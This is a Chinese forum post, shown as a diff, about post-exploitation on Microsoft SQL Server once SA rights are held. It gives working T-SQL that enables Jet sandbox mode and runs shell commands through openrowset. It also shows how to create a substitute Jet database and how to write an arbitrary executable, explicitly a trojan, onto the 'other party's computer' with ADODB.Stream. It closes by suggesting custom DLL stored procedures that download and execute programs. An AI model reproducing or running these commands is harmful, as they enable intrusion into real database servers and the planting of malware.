@@ -1,0 +1,54 @@
+以下方法可能带有攻击性,请各位同学不要用于入侵. 另,感谢高兴先生提供思路.
+
+转载请注明来源:http://www.t00ls.net
+以下方法都以需要SA权限为前提。
+
+1, 沙盒模式的变通.
+原始方法:
+
+第一句开启沙盘模式：exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+复制代码第二句利用jet.oledb执行系统命令：select * from openrowset('microsoft.jet.oledb.4.0',';database=ias\dnary.mdb','select shell("CMD命令")') 
+复制代码或select * from openrowset('microsoft.jet.oledb.4.0',';database=ias\ias.mdb','select shell("CMD命令")') 
+复制代码但是,当 X:\Windows\System32\ias\dnary.mdb 或 X:\Windows\System32\ias\ias.mdb 被删除时,命令就会无效了.
+
+所以利用以下语句创建一个数据库：(数据库名SysSetup.xml,后缀.xml是自定义,不影响使用.)declare @hr int
+
+declare @object int;declare @property int
+
+exec @hr = sp_OACreate 'ADOX.Catalog',@object OUTPUT
+
+exec @hr = sp_OAMethod @object,'Create',@property output,'Provider=Microsoft.Jet.OLEDB.4.0;Data Source=SysSetup.xml'
+复制代码然后再利用jet.oledb调用SysSetup.xml执行系统命令：select * from openrowset('microsoft.jet.oledb.4.0',';database=SysSetup.xml','select shell("CMD命令")')
+复制代码2, 直接写入文件到对方计算机,此处的文件可以是exe, dll,等.(注,此方法不支持文件大于64KB)
+
+当已经有一个程序需要放到对方计算机的时候.(例如, 放MA。)
+将这个文件转成HEX代码。
+如果不知道怎么把文件转成HEX代码,请使用下面的工具.
+ File2Hex.rar (424 Bytes) 下载次数: 101
+
+2009-12-15 21:08
+使用方法很简单, 解压出来之后, 把要转的文件拖到脚本上去, 就会生成包含HEX代码的文本.
+
+然后用以下方法写入到对方计算机中。DECLARE @ObjectToken INT
+
+EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT
+
+EXEC sp_OASetProperty @ObjectToken, 'Type', 1
+
+EXEC sp_OAMethod @ObjectToken, 'Open'
+
+EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x123456(其中0x123456为HEX内容)
+
+
+
+EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, 'Test.exe(文件名)', 2
+
+EXEC sp_OAMethod @ObjectToken, 'Close'
+
+EXEC sp_OADestroy @ObjectToken
+复制代码写入之后, 就发挥你的办法去执行你写入的这个文件就OK了。
+
+集思广益：
+现在很多计算机可以执行命令的方法都被人封得抓狂,就算有幸可以执行,也有可能CMD被改了权限..
+所以我推荐的办法是有能力的同学自己开发DLL,然后把DLL写入到对方计算机中,再注册为存储过程.
+至于存储过程的功能. 可以是下载程序并执行,  可以是直接执行命令. 当然这个看你自己了.
